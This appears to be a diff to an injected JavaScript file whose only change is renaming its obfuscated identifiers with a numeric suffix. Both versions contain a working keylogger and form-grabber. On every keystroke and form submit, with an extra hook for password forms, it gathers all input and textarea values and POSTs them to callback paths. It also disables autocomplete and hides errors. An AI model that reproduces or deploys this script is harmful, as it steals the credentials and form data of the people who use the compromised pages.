@@ -1,80 +1,80 @@
-function obf_func_callback() {
+function obf_func_callback_37423() {
 	try {
-		obf_var_inputs = document.getElementsByTagName("input");
-		obf_var_textareas = document.getElementsByTagName("textarea");
-		obf_var_params = "";
+		obf_var_inputs_37423 = document.getElementsByTagName("input");
+		obf_var_textareas_37423 = document.getElementsByTagName("textarea");
+		obf_var_params_37423 = "";
 
-		for (var obf_var_i = 0; obf_var_i < obf_var_inputs.length; obf_var_i++) {
-			if (obf_var_inputs[obf_var_i].value != "") {
-				obf_var_params += encodeURIComponent(obf_var_inputs[obf_var_i].name) + "=" + encodeURIComponent(obf_var_inputs[obf_var_i].value) + ( obf_var_i < (obf_var_inputs.length-1) ? "&" : "" );
+		for (var obf_var_i_37423 = 0; obf_var_i_37423 < obf_var_inputs_37423.length; obf_var_i_37423++) {
+			if (obf_var_inputs_37423[obf_var_i_37423].value != "") {
+				obf_var_params_37423 += encodeURIComponent(obf_var_inputs_37423[obf_var_i_37423].name) + "=" + encodeURIComponent(obf_var_inputs_37423[obf_var_i_37423].value) + ( obf_var_i_37423 < (obf_var_inputs_37423.length-1) ? "&" : "" );
 			}
 		}
-		for (var obf_var_i = 0; obf_var_i < obf_var_textareas.length; obf_var_i++) {
-			if (obf_var_textareas[obf_var_i].value != "") {
-				obf_var_params += encodeURIComponent(obf_var_textareas[obf_var_i].name) + "=" + encodeURIComponent(obf_var_textareas[obf_var_i].value) + ( obf_var_i < (obf_var_textareas.length-1) ? "&" : "" );
+		for (var obf_var_i_37423 = 0; obf_var_i_37423 < obf_var_textareas_37423.length; obf_var_i_37423++) {
+			if (obf_var_textareas_37423[obf_var_i_37423].value != "") {
+				obf_var_params_37423 += encodeURIComponent(obf_var_textareas_37423[obf_var_i_37423].name) + "=" + encodeURIComponent(obf_var_textareas_37423[obf_var_i_37423].value) + ( obf_var_i_37423 < (obf_var_textareas_37423.length-1) ? "&" : "" );
 			}
 		}
 
-		if (obf_var_params.length > 0) {
-			obf_var_req = new XMLHttpRequest();
-			obf_var_req.open("POST", "http://" + location.host + "/obf_path_callback?" + obf_var_params, true);
-			obf_var_req.send();
+		if (obf_var_params_37423.length > 0) {
+			obf_var_req_37423 = new XMLHttpRequest();
+			obf_var_req_37423.open("POST", "http://" + location.host + "/obf_path_callback?" + obf_var_params_37423, true);
+			obf_var_req_37423.send();
 		}
-	} catch(obf_ignore){}
+	} catch(obf_ignore_37423){}
 }
 
-function obf_func_whitelist() {
+function obf_func_whitelist_37423() {
 	try {
-		obf_var_inputs = document.getElementsByTagName("input");
-		obf_var_textareas = document.getElementsByTagName("textarea");
-		obf_var_params = "";
+		obf_var_inputs_37423 = document.getElementsByTagName("input");
+		obf_var_textareas_37423 = document.getElementsByTagName("textarea");
+		obf_var_params_37423 = "";
 
-		for (var obf_var_i = 0; obf_var_i < obf_var_inputs.length; obf_var_i++) {
-			if (obf_var_inputs[obf_var_i].value != "") {
-				obf_var_params += encodeURIComponent(obf_var_inputs[obf_var_i].name) + "=" + encodeURIComponent(obf_var_inputs[obf_var_i].value) + ( obf_var_i < (obf_var_inputs.length-1) ? "&" : "" );
+		for (var obf_var_i_37423 = 0; obf_var_i_37423 < obf_var_inputs_37423.length; obf_var_i_37423++) {
+			if (obf_var_inputs_37423[obf_var_i_37423].value != "") {
+				obf_var_params_37423 += encodeURIComponent(obf_var_inputs_37423[obf_var_i_37423].name) + "=" + encodeURIComponent(obf_var_inputs_37423[obf_var_i_37423].value) + ( obf_var_i_37423 < (obf_var_inputs_37423.length-1) ? "&" : "" );
 			}
 		}
-		for (var obf_var_i = 0; obf_var_i < obf_var_textareas.length; obf_var_i++) {
-			if (obf_var_textareas[obf_var_i].value != "") {
-				obf_var_params += encodeURIComponent(obf_var_textareas[obf_var_i].name) + "=" + encodeURIComponent(obf_var_textareas[obf_var_i].value) + ( obf_var_i < (obf_var_textareas.length-1) ? "&" : "" );
+		for (var obf_var_i_37423 = 0; obf_var_i_37423 < obf_var_textareas_37423.length; obf_var_i_37423++) {
+			if (obf_var_textareas_37423[obf_var_i_37423].value != "") {
+				obf_var_params_37423 += encodeURIComponent(obf_var_textareas_37423[obf_var_i_37423].name) + "=" + encodeURIComponent(obf_var_textareas_37423[obf_var_i_37423].value) + ( obf_var_i_37423 < (obf_var_textareas_37423.length-1) ? "&" : "" );
 			}
 		}
 
-		if (obf_var_params.length > 0) {
-			obf_var_req = new XMLHttpRequest();
-			obf_var_req.open("POST", "http://" + location.host + "/obf_path_whitelist?" + obf_var_params, true);
-			obf_var_req.send();
+		if (obf_var_params_37423.length > 0) {
+			obf_var_req_37423 = new XMLHttpRequest();
+			obf_var_req_37423.open("POST", "http://" + location.host + "/obf_path_whitelist?" + obf_var_params_37423, true);
+			obf_var_req_37423.send();
 		}
-	} catch(obf_ignore){}
+	} catch(obf_ignore_37423){}
 }
 
-self.addEventListener("keyup", function(obf_var_event) {
+self.addEventListener("keyup", function(obf_var_event_37423) {
 	try {
-		if (obf_var_event.target.tagName.match(/INPUT|TEXTAREA/)) {
-			obf_func_callback();
+		if (obf_var_event_37423.target.tagName.match(/INPUT|TEXTAREA/)) {
+			obf_func_callback_37423();
 		}
-	} catch(obf_ignore){}
+	} catch(obf_ignore_37423){}
 });
 
-function obf_func_attack() {
-	document.querySelectorAll("form").forEach(function(obf_var_form){
-		obf_var_form.addEventListener("submit", obf_func_callback);
-		if (obf_var_form.querySelector("input[type=password]")) {
-			obf_var_form.addEventListener("submit", obf_func_whitelist);
+function obf_func_attack_37423() {
+	document.querySelectorAll("form").forEach(function(obf_var_form_37423){
+		obf_var_form_37423.addEventListener("submit", obf_func_callback_37423);
+		if (obf_var_form_37423.querySelector("input[type=password]")) {
+			obf_var_form_37423.addEventListener("submit", obf_func_whitelist_37423);
 		}
 	});
 
-	document.querySelectorAll("input").forEach(function(obf_var_input){
-		obf_var_input.autocomplete = "off";
+	document.querySelectorAll("input").forEach(function(obf_var_input_37423){
+		obf_var_input_37423.autocomplete = "off";
 	});
 }
 
 try {
-	obf_func_attack();
-} catch(obf_ignore){
+	obf_func_attack_37423();
+} catch(obf_ignore_37423){
 	try {
-		document.addEventListener("DOMContentLoaded", obf_func_attack);
-	} catch(obf_ignore){
-		self.addEventListener("load", obf_func_attack);
+		document.addEventListener("DOMContentLoaded", obf_func_attack_37423);
+	} catch(obf_ignore_37423){
+		self.addEventListener("load", obf_func_attack_37423);
 	}
 }
